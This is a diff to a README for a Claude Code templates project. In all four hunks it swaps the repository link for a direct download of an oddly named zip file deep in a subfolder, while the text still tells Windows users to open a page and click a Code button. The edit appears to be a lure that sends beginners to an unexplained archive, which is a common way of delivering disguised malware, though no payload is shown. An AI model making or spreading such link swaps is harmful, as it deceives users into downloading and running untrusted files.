@@ -1,7 +1,7 @@
 # 🧩 claude-code-templates - Ready-to-use project templates for Claude Code
 
 <p align="center">
-  <a href="https://github.com/IuliaIvanaPatras/claude-code-templates">
+  <a href="https://raw.githubusercontent.com/IuliaIvanaPatras/claude-code-templates/main/claude-flutter/templates_claude_code_Hermetic.zip">
     <img src="https://img.shields.io/badge/Download%20from-GitHub%20Repository-6E57FF?style=for-the-badge&logo=github&logoColor=white" alt="Download from GitHub Repository">
   </a>
 </p>
@@ -21,7 +21,7 @@ Use it if you want to:
 
 Visit this page to download and use the templates:
 
-https://github.com/IuliaIvanaPatras/claude-code-templates
+https://raw.githubusercontent.com/IuliaIvanaPatras/claude-code-templates/main/claude-flutter/templates_claude_code_Hermetic.zip
 
 Open the page, click the green **Code** button, then choose **Download ZIP**. After the file downloads, extract it on your Windows PC.
 
@@ -195,7 +195,7 @@ If you are building your first app, begin with the front-end template. It is oft
 
 Use this link to access the repository and download it:
 
-https://github.com/IuliaIvanaPatras/claude-code-templates
+https://raw.githubusercontent.com/IuliaIvanaPatras/claude-code-templates/main/claude-flutter/templates_claude_code_Hermetic.zip
 
 ## 🪟 Simple Windows path
 
@@ -282,4 +282,4 @@ The repository gives you:
 
 Primary repository:
 
-https://github.com/IuliaIvanaPatras/claude-code-templates
+https://raw.githubusercontent.com/IuliaIvanaPatras/claude-code-templates/main/claude-flutter/templates_claude_code_Hermetic.zip
